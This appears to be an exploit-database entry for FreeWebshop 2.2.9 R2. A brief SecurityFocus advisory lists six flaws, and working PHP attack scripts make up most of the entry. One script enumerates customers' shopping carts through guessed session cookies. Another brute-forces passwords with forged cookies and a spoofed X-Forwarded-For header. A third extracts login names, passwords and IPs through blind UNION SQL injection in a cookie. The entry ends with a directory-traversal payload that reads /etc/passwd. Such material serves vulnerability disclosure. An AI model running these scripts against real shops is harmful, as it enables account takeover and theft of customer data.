source: http://www.securityfocus.com/bid/37513/info

FreeWebshop is prone to multiple remote vulnerabilities:

1. A security vulnerability that may allow attackers to spoof HTTP headers.
2. A security vulnerability involving the handling of sessions.
3. A security vulnerability that may allow attackers to brute-force passwords.
4. A security-bypass vulnerability.
5. An SQL-injection vulnerability.
6. A directory-traversal vulnerability.

Exploiting these issues could allow an attacker to compromise the application, access or modify data, exploit latent vulnerabilities, gain unauthorized access to the affected application, and obtain sensitive information.

FreeWebshop.org 2.2.9 R2 is vulnerable; other versions may also be affected. 

<?php
$url = "http://127.0.0.1/index.php?page=cart&action=show";
$max = 1000;

for($customerid = 1; $customerid <= $max; $customerid++)
{
echo "<h3>Customerid: " . $customerid .
"</h3>\n";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_COOKIE, "fws_guest=" . $customerid);
$result = curl_exec($ch);
curl_close($ch);
$result = str_replace("\n", "", $result);
preg_match("/(Wat zit er in uw winkelwagen.*)<\/table>/", $result,
$matches);
echo strip_tags($matches[1]);
}
?>

<?php
$url = "http://127.0.0.1/index.php?page=main";
$max = 1000;
$passwords = array("admin_1234", "admin", "password");
$ipspoof = "127.0.0.1";

for($customerid = 1; $customerid <= $max; $customerid++)
{
foreach($passwords as $password)
{
$cookie = "fws_cust=foobar-" . $customerid . "-" . md5(md5($password));
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Forwarded-For: " .
$ipspoof . "\n"));
$result = curl_exec($ch);
curl_close($ch);
if(preg_match("/Persoonlijke pagina/", $result))
{
echo "Found password: " . $password . " for customerid: " .
$customerid . "<br>\n";
echo "Cookie: " . $cookie . "<br>\n";
}
}
}
?>

<?php
$url = "http://127.0.0.1/index.php?page=main";
$tablename = "fws_customer";
$fieldnames = array("LOGINNAME", "PASSWORD", "IP");
$userid = 1;
$loginname = "";
$password = "";
$ip = "";

foreach($fieldnames as $fieldname)
{
$index = 1;
echo $fieldname . ": ";
while(TRUE)
{
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_COOKIE,
"fws_cust=fubar-0)+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%
2CASCII(SUBSTRING(" .
$fieldname . "%2C" . $index . "%2C1))%2C8+FROM+" . $tablename .
"+WHERE+ID%3D" . $userid . "%2F*-md5");
$result = curl_exec($ch);
curl_close($ch);
preg_match("/Winkelwagen \((\d+)\)/", $result, $matches);
if(intval($matches[1]) == 0)
{
break;
}
switch($fieldname)
{
case "LOGINNAME":
$loginname .= chr($matches[1]);
break;
case "PASSWORD":
$password .= chr($matches[1]);
break;
case "IP":
$ip .= chr($matches[1]);
break;
}
echo chr($matches[1]);
$index++;
}
echo "<br>\n";
}

../../../../../../../etc/passwd%00